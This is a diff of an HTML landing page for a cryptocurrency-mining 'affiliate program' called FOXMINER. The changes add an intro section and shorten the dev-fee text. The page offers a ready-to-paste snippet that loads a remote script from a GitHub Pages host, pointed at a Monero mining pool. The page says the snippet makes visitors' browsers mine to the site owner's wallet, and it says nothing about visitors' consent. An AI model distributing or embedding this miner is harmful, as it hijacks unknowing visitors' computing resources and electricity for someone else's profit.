@@ -18,6 +18,9 @@
         .hamburger { display: none; font-size: 2em; cursor: pointer; color: #E94560; }
         .affiliate { max-width: 800px; margin: 35px auto; padding: 20px; background: #16213E; border-radius: 10px; text-align: center; }
         h1 { font-size: 2em; color: #E94560; margin-bottom: 20px; }
+        .intro-section { margin-top: 20px; padding: 20px; background: #0F3460; border-radius: 10px; text-align: center; box-shadow: 0 0 10px rgba(233, 69, 96, 0.3); }
+        .intro-section h2 { font-size: 1.5em; color: #E94560; margin: 0 0 10px; }
+        .intro-section p { font-size: 1em; color: #B0B0B0; margin: 0 0 15px; line-height: 1.4; }
         .affiliate-section { margin-top: 20px; padding: 20px; background: #0F3460; border-radius: 10px; text-align: center; box-shadow: 0 0 10px rgba(233, 69, 96, 0.3); }
         .affiliate-section h2 { font-size: 1.5em; color: #E94560; margin: 0 0 10px; }
         .affiliate-section p { font-size: 1em; color: #B0B0B0; margin: 0 0 15px; line-height: 1.4; }
@@ -68,11 +71,14 @@
     </header>
     <div class="affiliate">
         <h1>FOXMINER Affiliate Program</h1>
-        <p style="font-size: 1em; color: #B0B0B0; margin-bottom: 20px;">Earn Monero (XMR) by adding our mining script to your website!</p>
+        <div class="intro-section">
+            <h2>Monetize Your Website with FOXMINER</h2>
+            <p>Turn your website traffic into Monero (XMR) with our simple mining script. Visitors’ browsers mine XMR to your wallet while they browse—no apps or hardware needed. We take a 5% dev fee to keep FOXMINER running, so you keep 95% of the profits.</p>
+        </div>
         
         <div class="affiliate-section">
             <h2>Your Affiliate Script</h2>
-            <p>Copy the script below, replace <code>YOUR_XMR_WALLET_HERE</code> with your Monero wallet address, and paste it in your website's HTML just before the closing <code>&lt;/body&gt;</code> tag.</p>
+            <p>Copy the script below, replace <code>YOUR_XMR_WALLET_HERE</code> with your Monero wallet address, and paste it in your website's HTML just before the closing <code></body></code> tag.</p>
             <textarea readonly>
 <script>var affiliateWallet = 'YOUR_XMR_WALLET_HERE';</script>
 <script src="https://foxminer-web.github.io/Foxminer/copiedscript.js?karma=bs?nosaj=gulf.moneroocean.stream:80"></script>
@@ -82,8 +88,7 @@
 
         <div class="dev-fee">
             <h2>About Our Dev Fee</h2>
-            <p>A small ~5-10% dev fee is included to keep our servers running and maintain the FOXMINER frontend UI. This ensures we can continue providing a top-notch mining experience for you and your users.</p>
-            <p>Thank you for supporting the FOXMINER team!</p>
+            <p>Our 5% dev fee keeps FOXMINER’s servers and frontend UI running smoothly. Thank you for supporting our platform!</p>
         </div>
     </div>
     <script>
